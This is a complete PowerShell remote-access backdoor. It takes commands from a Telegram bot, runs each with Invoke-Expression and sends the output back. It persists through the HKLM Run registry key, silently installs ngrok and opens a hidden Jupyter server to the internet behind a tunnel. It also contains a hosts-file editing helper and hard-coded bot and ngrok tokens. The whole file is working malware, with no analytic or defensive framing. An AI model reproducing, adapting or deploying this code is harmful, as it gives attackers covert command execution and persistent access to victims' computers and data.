
function read-comm()
{
    Param
    (
       [Parameter(Mandatory=$true, Position=0)]
        $apiToken,
        [Parameter(Mandatory=$true, Position=1)]
        [string] $offset
   )
    $url="https://api.telegram.org/bot$apiToken/getUpdates?offset=$offset"
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url -UseBasicParsing
    $ProgressPreference = 'Continue'
    $test = $r | ConvertFrom-Json
    $message = $test.result.message[-1]
    $message = $message.text
    $offset = $test.result.update_id[-1]
    return $message, $offset
}



function Excmd
{

   param
   (
          [Parameter(Mandatory)]
      [string] $command
    )
   $ProgressPreference = 'SilentlyContinue' 
   $out = Invoke-Expression -Command $command | Out-String
   $ProgressPreference = 'Continue'
   return $out
}

function Send-data ($data,$apiToken,$chat_id)
{
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$data"
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url
    $ProgressPreference = 'Continue'
    
}


function First-offset
{
    Param
    (
         [Parameter(Mandatory=$true, Position=0)]
         [string] $apiToken
    )

    $url = "https://api.telegram.org/bot$apiToken/getUpdates?offset="
    $ProgressPreference = 'SilentlyContinue' 
    $r=Invoke-WebRequest -Uri $url -UseBasicParsing | ConvertFrom-Json
    $ProgressPreference = 'Continue'
    $Foffset = $r.result.update_id
    $foo = $Foffset[-1]
    if ($foo.ToString().Length -gt 1)
    {
        return $foo
    }
    else
    {
        return $Foffset
    }

}


function start-myshell($apiToken,$chat_id,$urlToNG)
{
    # Param
    # (
    #     [Parameter(Mandatory=$true, Position=0)]
    #     [string] $apiToken,
    #     [Parameter(Mandatory=$true, Position=1)]
    #     [string] $chat_id
    #     [Parameter(Mandatory=$true, Position=2)]
    #     [string] $urlToNG
    # )

    $currentuser = [System.Environment]::UserName
    $currentip = (Test-Connection -ComputerName $env:computername -count 1).IPv4Address.IPAddressToString
    Send-data -data "User $currentuser is Connected!" -chat_id $chat_id -apiToken $apiToken
    if (-not($urlToNG -eq $null))
    {
        Send-data -apiToken $apiToken -chat_id $chat_id -data "Ngrok url of $currentip is : $urlToNG"
    }
    $addpers = Add-Run
    if ($addpers -like "Added")
    {
        Send-data -apiToken $apiToken -chat_id $chat_id -data "successfully added program to the registry!"
    }
    else{
        if($addpers -eq $false)
        {
           Send-data -apiToken $apiToken -chat_id $chat_id -data "failed to add item to the registry!" 
        }
    }

    $offset = First-offset $apiToken
    $foo = $offset
    while ($true)
    {
        try
        {   
            
            $message = read-comm -apiToken $apiToken -offset $offset
            $offset = $message[1]
            if ($offset.contains(" "))
            {
                $offset = -split $offset
                $offset = $offset[-1]
            }

            
            if (-not($offset -eq $foo))
            {
                $foo=$offset
                $command = $message[0]
                $output = Excmd $command
                Send-data -data $output -chat_id $chat_id -apiToken $apiToken
                
            }
            
        }    
        
        catch 
        {
            $errors = 1
        }
        Start-Sleep -Seconds 1  
    } 

}

function start-ngrok($port,$path)
{
    "taskkill /IM ngrok.exe /F >nul: 2>nul:" | cmd -ErrorAction SilentlyContinue | Out-Null
    $path = "$path\ngrok.exe"
    $arrgs = "http $port"
    start-process $path -ArgumentList $arrgs -WindowStyle hidden | Out-Null
}

function Start-Jupyter($token,$port)
{
    $arrgs = "--ip 0.0.0.0 --no-browser --port=$port --allow-root --NotebookApp.token='$token'" 
    start-process "jupyter-notebook.EXE" -ArgumentList "$arrgs" -WindowStyle hidden
}

function Get-ngrokToken()
{
    try
    {
        $res = Invoke-WebRequest http://localhost:4040/api/tunnels
        $res = $res | ConvertFrom-Json
        $res = $res.tunnels ; $res = $res.public_url
        return $res
    }
    catch
    {
        try
        {
            $res = curl  http://localhost:4040/api/tunnels
            $res = $res | ConvertFrom-Json
            $res = $res.tunnels ; $res = $res.public_url
            return $res
        }
        catch{
            return $false
        }
    }
   
}

function Start-JupShell($port,$pathToNg,$token)
{
    $pro = Get-Process | where ProcessName -like *jupyter-notebook*
    $pro = $pro.Id

    foreach($i in $pro)
    {
        Stop-Process -Id $i -ErrorAction SilentlyContinue | Out-Null
    }

    try
    {
        start-jupyter -token $token -port $port
        start-ngrok -path $pathToNg -port $port
        return get-ngrokToken
    }
    catch
    {
        return "Error was occurred while processing" 
    }
}




function ismodified($hostd,$domain)
{
    $cont = Get-Content "C:\Windows\System32\drivers\etc\hosts"
    if (-not("$hostd $domain" -in $cont))
    {
        echo "`n$hostd $domain" >> "C:\Windows\System32\drivers\etc\hosts"
    }
}

function Add-Run
{
    $name = "testRun"
    $value = [Environment]::GetCommandLineArgs()[0]
    $regloc = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    $key = Get-Item -LiteralPath $regloc
    
    if ($key.GetValue($name, $null) -eq $null)
    {
        try
        {
            New-ItemProperty -Path $regloc -Name $name -Value $value -ErrorAction SilentlyContinue | Out-Null
        }
        catch
        {
            $err = 1
        }
        if (-not($key.GetValue($name, $null) -eq $null))
        {
            return "Added"
        }
        else
        {
            return $false
        }
    }
    return $true
}


try
{
    $path_to_ngrok = "C:\ngrok\ngrok.exe"
    if([System.IO.File]::Exists($path_to_ngrok)-eq $false)
    {
        mkdir C:\ngrok
        Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile C:\ngrok\ngrok.zip
        Expand-Archive .\ngrok.zip
        ngrok config add-authtoken 29vkNHzdWuNEUj0ThSaFJEpxdvT_3MLz6UiVLrJriFtCvT7XR
    }


    $urlToNG = Start-JupShell -port "9090" -pathToNg C:\ngrok -token 'yourComputerHasBeenHacked'
}
catch{
    $err = 1
}

$apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
$chat_id = '-1001830797904'
start-myshell -apiToken $apiToken -chat_id $chat_id -urlToNG $urlToNG


